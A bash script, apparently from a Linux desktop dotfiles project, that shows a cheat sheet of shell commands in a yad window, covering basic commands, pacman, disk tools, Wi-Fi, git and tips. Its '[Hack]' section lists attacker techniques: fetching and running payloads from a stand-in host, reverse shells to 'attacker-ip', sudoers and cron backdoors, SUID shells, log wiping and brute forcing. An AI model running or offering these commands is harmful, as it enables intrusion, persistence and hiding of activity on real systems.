#!/bin/bash
# /* ---- 💫 https://github.com/JaKooLit 💫 ---- */  ##

# GDK BACKEND. Change to either wayland or x11 if having issues
BACKEND=wayland

# Check if rofi or yad is running and kill them if they are
if pidof rofi > /dev/null; then
  pkill rofi
fi

if pidof yad > /dev/null; then
  pkill yad
fi

# Launch yad with calculated width and height
GDK_BACKEND=$BACKEND yad \
    --center \
    --title="Commands Sheet" \
    --no-buttons \
    --list \
    --column=Command: \
    --column=Description: \
    --timeout-indicator=bottom \
"[Common]" "" \
"ls" "List files and directories." \
"cd" "Change to another directory." \
"pwd" "Print the current directory path." \
"mkdir folder" "Create a new directory named 'folder'." \
"rm file" "Remove a file." \
"rm -r folder" "Remove a folder and its contents." \
"cp source target" "Copy a file or directory." \
"mv source target" "Move or rename a file or folder." \
"clear" "Clear the terminal screen." \
"echo text" "Print text to the terminal." \
"cat file" "Show the contents of a file." \
"touch file" "Create an empty file." \
"sudo command" "Run a command with superuser privileges." \
"man command" "Show the manual page for a command." \
"apt update" "Update the list of available packages (Debian/Ubuntu)." \
"apt upgrade" "Upgrade all upgradable packages." \
"ping address" "Send network packets to test connectivity." \
"top" "Display running processes in real-time." \
"htop" "Interactive process viewer (enhanced 'top')." \
"whoami" "Print the current username." \
"" "" \
"" "" \
"[Common Extended]" "" \
"ls" "List files and directories in the current location." \
"ls -a" "List all files, including hidden files." \
"ls -R" "List all files in subdirectories recursively." \
"ls -l" "List files in long format with details like permissions, size, and owner." \
"pwd" "Print the current working directory." \
"cd" "Change directory to the specified path." \
"cd .." "Move up one directory level." \
"cd ~" "Change to the home directory." \
"cd -" "Switch to the previous directory." \
"mkdir" "Create a new directory." \
"rmdir" "Remove an empty directory." \
"rm" "Remove a file." \
"rm -r" "Remove a directory and its contents recursively." \
"rm -f" "Force remove a file without confirmation." \
"cp" "Copy files or directories." \
"cp -r" "Copy directories recursively." \
"mv" "Move or rename files or directories." \
"mv oldname newname" "Rename a file or directory." \
"touch" "Create a new empty file." \
"cat" "Display the contents of a file." \
"cat > filename" "Create a new file and enter text into it." \
"more" "View the contents of a file one screen at a time." \
"less" "View the contents of a file with backward navigation." \
"head" "Display the first 10 lines of a file." \
"tail" "Display the last 10 lines of a file." \
"tail -f" "Follow the end of a file in real-time." \
"chmod" "Change the permissions of a file or directory." \
"chown" "Change the owner and group of a file or directory." \
"chgrp" "Change the group ownership of a file or directory." \
"find" "Search for files in a directory hierarchy." \
"find /path/to/search -name filename" "Find a file by name." \
"locate" "Find files by name using a prebuilt database." \
"updatedb" "Update the database used by locate." \
"which" "Show the full path of shell commands." \
"whereis" "Locate the binary, source, and manual page files for a command." \
"man" "Display the manual page for a command." \
"info" "Display the info documentation for a command." \
"whatis" "Display a one-line description of a command." \
"apropos" "Search the manual page names and descriptions." \
"alias" "Create an alias for a command." \
"unalias" "Remove an alias." \
"history" "Show the command history." \
"!!" "Repeat the last command." \
"!" "Repeat a specific command from history." \
"exit" "Exit the current shell session." \
"clear" "Clear the terminal screen." \
"echo" "Display a line of text." \
"date" "Display or set the system date and time." \
"uptime" "Show how long the system has been running." \
"top" "Display Linux tasks." \
"htop" "Interactive process viewer (requires installation)." \
"ps" "Report a snapshot of current processes." \
"kill" "Terminate a process by PID." \
"killall" "Terminate processes by name." \
"bg" "Resume a suspended job in the background." \
"fg" "Bring a job to the foreground." \
"jobs" "List active jobs." \
"wget" "Download files from the web." \
"curl" "Transfer data from or to a server." \
"scp" "Securely copy files between hosts." \
"rsync" "Remote file and directory synchronization." \
"tar" "archive files." \
"tar -cvf" "Create a tar archive." \
"tar -xvf" "Extract a tar archive." \
"gzip" "Compress files." \
"gunzip" "Decompress files." \
"zip" "Package and compress files." \
"unzip" "Extract compressed files." \
"bzip2" "Compress files using Burrows-Wheeler block sorting." \
"bunzip2" "Decompress bzip2 compressed files." \
"xz" "Compress files using the LZMA algorithm." \
"unxz" "Decompress xz compressed files." \
"df" "Display disk space usage." \
"du" "Estimate file space usage." \
"free" "Display memory usage." \
"top" "Display Linux tasks." \
"htop" "Interactive process viewer." \
"ps" "Report a snapshot of current processes." \
"killall" "Terminate processes by name." \
"bg" "Resume a suspended job in the background." \
"fg" "Bring a job to the foreground." \
"jobs" "List active jobs." \
"shutdown" "Shut down the system." \
"reboot" "Reboot the system." \
"init 0" "Shut down the system." \
"init 6" "Reboot the system." \
"hostname" "Show or set the system's hostname." \
"hostnamectl" "Control the system hostname." \
"timedatectl" "Control the system time and date." \
"timedatectl set-timezone" "Set the system time zone." \
"timedatectl set-time" "Set the system date and time." \
"timedatectl set-ntp" "Enable or disable NTP synchronization." \
"systemctl" "Control the systemd system and service manager." \
"systemctl start" "Start a service." \
"systemctl stop" "Stop a service." \
"systemctl restart" "Restart a service." \
"systemctl status" "Show the status of a service." \
"systemctl enable" "Enable a service to start on boot." \
"systemctl disable" "Disable a service from starting on boot." \
"systemctl is-active" "Check if a service is active." \
"systemctl is-enabled" "Check if a service is enabled." \
"systemctl list-units" "List units currently loaded." \
"" "" \
"" "" \
"[Pacman]"  "" \
"sudo pacman -S package" "Install a package." \
"sudo pacman -S nano" "Install the nano text editor." \
"sudo pacman -R package" "Remove a package." \
"sudo pacman -R nano" "Remove the nano text editor." \
"sudo pacman -Syu" "Update the system (sync and upgrade everything)." \
"sudo pacman -Syu" "Run this often to keep your system up to date." \
"pacman -Qs name" "Search for a package in the repository." \
"pacman -Qs vlc" "Search for VLC-related packages." \
"pacman -Q" "List all installed packages." \
"pacman -Qi package" "Show details about an installed package." \
"pacman -Qi nano" "Show info like version, size, and dependencies of nano." \
"sudo pacman -Scc" "Clear the entire package cache." \
"sudo pacman -Scc" "Frees disk space but removes all downloaded packages." \
"pacman -Qdt" "List orphaned packages (no longer needed)." \
"pacman -Qdt" "Use to find unused dependencies." \
"sudo pacman -Rns package" "Remove package, unused dependencies, and config files." \
"sudo pacman -Rns nano" "Fully remove nano and its leftovers." \
"pacman -Ql package" "List all files installed by a package." \
"pacman -Ql bash" "See where bash files are located." \
"" "" \
"" "" \
"[Disk]"  "" \
"lsblk" "List all block devices including disks and partitions." \
"fdisk -l" "Display partition tables for all disks." \
"df -h" "Show disk space usage in human-readable format." \
"du -sh" "Show size of current directory." \
"blkid" "Print block device attributes like UUID and type." \
"parted -l" "Show partition layout of all disks." \
"ls -l /dev/disk/by-uuid/" "Show disks and their UUIDs." \
"mount | column -t" "Display currently mounted filesystems." \
"smartctl -a /dev/sdX" "Show detailed S.M.A.R.T. info for a disk." \
"cfdisk /dev/sdX" "Graphical partition editor in terminal." \
"fdisk /dev/sdX" "Create or delete partitions on a disk." \
"parted /dev/sdX" "Manage partitions with the parted tool." \
"mkfs.ext4 /dev/sdX1" "Format a partition with the ext4 filesystem." \
"wipefs -a /dev/sdX" "Erase filesystem signatures (non-destructive wipe)." \
"fdisk /dev/sdX" "Delete partitions manually via fdisk interface." \
"shred -v /dev/sdX" "Securely overwrite a disk (slower but safer)." \
"testdisk" "Recover lost partitions and repair boot sectors." \
"photorec" "Recover deleted files from disks." \
"extundelete /dev/sdX1 --restore-all" "Recover deleted files from ext3/ext4 partition." \
"" "" \
"" "" \
"[iwctl]"  "" \
"iwctl" "Start the interactive wireless control shell." \
"device list" "List wireless devices available on the system." \
"station device scan" "Scan for available Wi-Fi networks." \
"station device get-networks" "Show Wi-Fi networks found after scanning." \
"station device connect SSID" "Connect to a Wi-Fi network with the given SSID." \
"station device disconnect" "Disconnect from the currently connected network." \
"station device show" "Show connection status and info for a wireless device." \
"known-networks list" "List saved Wi-Fi networks." \
"known-networks forget SSID" "Forget a saved Wi-Fi network." \
"exit" "Exit the iwctl interactive shell." \
"" "" \
"" "" \
"[nmcli]"  "" \
"nmcli device status" "Show status of all network interfaces." \
"nmcli device wifi list" "Scan and list nearby Wi-Fi networks." \
"nmcli device wifi connect SSID" "Connect to a Wi-Fi network by SSID." \
"nmcli device wifi connect SSID password PASSWORD" "Connect to Wi-Fi with SSID and password." \
"nmcli connection show" "List all saved network connections." \
"nmcli connection up CONNECTION_NAME" "Activate a saved network connection." \
"nmcli connection down CONNECTION_NAME" "Deactivate a specific network connection." \
"nmcli connection delete CONNECTION_NAME" "Delete a saved network connection." \
"nmcli radio wifi off" "Turn off the Wi-Fi radio." \
"nmcli radio wifi on" "Turn on the Wi-Fi radio." \
"nmcli general status" "Show overall NetworkManager status." \
"nmcli networking off" "Disable all networking (airplane mode)." \
"nmcli networking on" "Enable all networking." \
"" "" \
"" "" \
"[git]" "" \
"git init" "Initialize a new Git repository in the current directory Example git init" \
"git clone repo-url" "Copy a remote repo to your local machine Example git clone https://github.com/user/repo.git" \
"git status" "Show changed staged or untracked files Example git status" \
"git add filename" "Stage a file for commit Example git add main.py" \
"git add ." "Stage all files in the current directory Example git add ." \
"git commit -m message" "Commit staged files with a message Example git commit -m Initial commit" \
"git log" "Show commit history Example git log" \
"git diff" "Show unstaged changes Example git diff" \
"git diff --staged" "Show changes between staged and last commit Example git diff --staged" \
"git push" "Send local commits to a remote repo Example git push origin main" \
"git pull" "Get changes from a remote repo and merge Example git pull origin main" \
"git fetch" "Download changes from a remote without merging Example git fetch origin" \
"git branch" "List all branches Example git branch" \
"git branch branchname" "Create a new branch Example git branch feature-x" \
"git checkout branchname" "Switch to another branch Example git checkout main" \
"git checkout -b branchname" "Create and switch to a new branch Example git checkout -b dev" \
"git merge branchname" "Merge a branch into the current one Example git merge feature-x" \
"git remote -v" "Show remote repository URLs Example git remote -v" \
"git reset filename" "Unstage a file Example git reset main.py" \
"git rm filename" "Remove a file from tracking and disk Example git rm old.py" \
"" "" \
"" "" \
"[Hack]" "" \
"who" "See who is currently logged into the system." \
"w" "Display who is logged in and what they are doing." \
"last" "Show the history of logins on the system." \
"lastb" "Display failed login attempts (if btmp is enabled)." \
"uptime" "Show how long the system has been running." \
"ss -tuln" "List open ports and listening services." \
"ps aux" "List all running processes with detailed info." \
"netstat -tulpn" "Show active connections and listening ports (if installed)." \
"lsof -i" "List open files and the network connections they’re using." \
"top" "Monitor real-time processes and resource usage." \
"htop" "Enhanced real-time process viewer (if installed)." \
"journalctl -xe" "Show recent system log entries, including errors and warnings." \
"tail -f /var/log/auth.log" "Watch authentication attempts in real-time (Debian/Ubuntu)." \
"tail -f /var/log/secure" "Monitor authentication attempts (RHEL/CentOS/Fedora)." \
"fail2ban-client status" "Check status of Fail2Ban protection (if installed)." \
"chkrootkit" "Scan the system for rootkits (if installed)." \
"rkhunter --check" "Run a rootkit scan (if rkhunter is installed)." \
"sudo ufw status" "Check if the firewall is active and which ports are open (UFW)." \
"sudo iptables -L" "List current firewall rules." \
"wget http://malicious.site/payload.sh" "Download a malicious script or payload from a server." \
"curl http://malicious.site/payload.sh" "Another way to download remote scripts silently." \
"chmod +x payload.sh" "Make the downloaded script executable." \
"./payload.sh" "Execute the potentially malicious script." \
"useradd hacker -G sudo" "Add a new user with sudo privileges (if already compromised)." \
"echo 'hacker:password' | chpasswd" "Set a password for a new or compromised user." \
"crontab -e" "Add persistent tasks that run on reboot or intervals (persistence method)." \
"rm -rf /var/log/*" "Delete logs to erase traces of activity (VERY dangerous)." \
"history -c" "Clear command history to hide tracks." \
"sudo -l" "Check which commands can be run with sudo — useful for privilege escalation." \
"ps -aux | grep sshd" "Check for SSH sessions — used to hijack or monitor users." \
"iptables -F" "Flush all firewall rules — disables protection if attacker has root access." \
"ufw disable" "Disable the Uncomplicated Firewall (UFW) completely." \
"systemctl stop ufw" "Stop the UFW service, exposing the system." \
"echo 0 > /proc/sys/net/ipv4/ip_forward" "Temporarily disable routing rules; can be abused to manipulate traffic." \
"echo '*/5 * * * * root /bin/bash /tmp/backdoor.sh' >> /etc/crontab" "Set a cron job to run a malicious script every 5 minutes." \
"echo 'malicioususer ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" "Give root access to a new user silently." \
"cp /bin/bash /tmp/.hiddenbash && chmod +s /tmp/.hiddenbash" "Create a hidden bash shell with SUID bit (privilege escalation)." \
"bash -i >& /dev/tcp/attacker-ip/4444 0>&1" "Start a reverse shell to attacker IP, bypassing incoming firewall rules." \
"nc attacker-ip 4444 -e /bin/bash" "Netcat command to open a backdoor shell session (if netcat is installed)." \
"mkfifo /tmp/f; nc attacker-ip 4444 < /tmp/f | /bin/sh > /tmp/f" "FIFO-based reverse shell that is harder to detect." \
"unset HISTFILE" "Prevent bash history from being saved for the current session." \
"rm -f ~/.bash_history" "Delete bash history file." \
"touch -acmr /bin/ls payload" "Match timestamps of malicious file to a normal binary to hide changes." \
"alias ls='ls --color=none'" "Remove coloring from ls to hide strange-looking files." \
"sudo -l" "Check which commands can be run as root — often shows exploitable misconfigurations." \
"env -i SHELL=/bin/bash sudo -s" "Exploit misconfigured sudo permissions to get root shell." \
"docker run -v /:/mnt --rm -it alpine chroot /mnt" "Exploit Docker to escape to host system if misconfigured." \
"nmap target-ip" "Scan open ports and detect services on a system Example nmap 192.168.1.1" \
"nmap -sV target-ip" "Scan services and versions for vulnerabilities Example nmap -sV 192.168.1.1" \
"whoami" "Show current user identity Example whoami" \
"nc -lvnp port" "Start a netcat listener for reverse shell Example nc -lvnp 4444" \
"bash -i >& /dev/tcp/ip/port 0>&1" "Reverse shell using bash Example bash -i >& /dev/tcp/192.168.1.2/4444 0>&1" \
"hydra -l user -P passlist.txt ssh://ip" "Brute force SSH credentials Example hydra -l admin -P rockyou.txt ssh://192.168.1.1" \
"john hashfile" "Crack password hashes using John the Ripper Example john hashes.txt" \
"sqlmap -u url --dbs" "Find and exploit SQL injection Example sqlmap -u http://site.com/page?id=1 --dbs" \
"curl -I site.com" "Check HTTP headers for fingerprinting Example curl -I example.com" \
"wget url" "Download a file from a remote server Example wget http://example.com/payload.sh" \
"chmod +s /bin/bash" "Set SUID on bash for privilege escalation (very dangerous) Example chmod +s /bin/bash" \
"find / -perm -4000 2>/dev/null" "Find SUID binaries that might be exploitable Example find / -perm -4000 2>/dev/null" \
"python3 -m http.server 8080" "Start a simple web server for file transfer Example python3 -m http.server 8080" \
"" "" \
"" "" \
"[Special]"  "" \
"nano /etc/systemd/timesyncd.conf" "arch pre install timesync fix to NTP=time.cloudflare.com time.google.com" \
"systemctl restart systemd-timesyncd" "restart the timesync" \
"sudo gdisk /dev/sdX" "there are 4 questions, answer it 1 by 1 with these letters(x,z,y,y) to format your disk" \
"nano /usr/share/applications/app.desktop" "Find this after that command Exec=/usr/bin/app --ozone-platform=x11 %U and add the ozone platform so  that u can copy paste on that app." \
"find" "find ~/.local/share/applications /usr/share/applications -name "kitty.desktop"" \
"ncdu /" "show a tree of files with their size (package)" \
"foremost -h" "show a list of commands for recovering files" \
"foremost -t all or png,jpg,etc" "(-v -q -i /dev/victimfile -o /root/Desktop/outputfile) to recover permanently deleted files." \

